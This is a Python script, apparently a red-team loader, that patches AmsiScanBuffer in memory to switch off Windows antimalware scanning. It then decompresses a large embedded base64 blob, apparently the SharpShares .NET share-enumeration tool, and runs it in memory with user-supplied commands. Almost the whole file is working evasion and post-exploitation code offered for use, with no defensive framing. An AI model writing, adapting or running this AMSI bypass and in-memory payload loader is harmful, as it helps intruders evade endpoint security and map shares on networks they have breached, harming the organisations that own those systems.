import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpShares.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()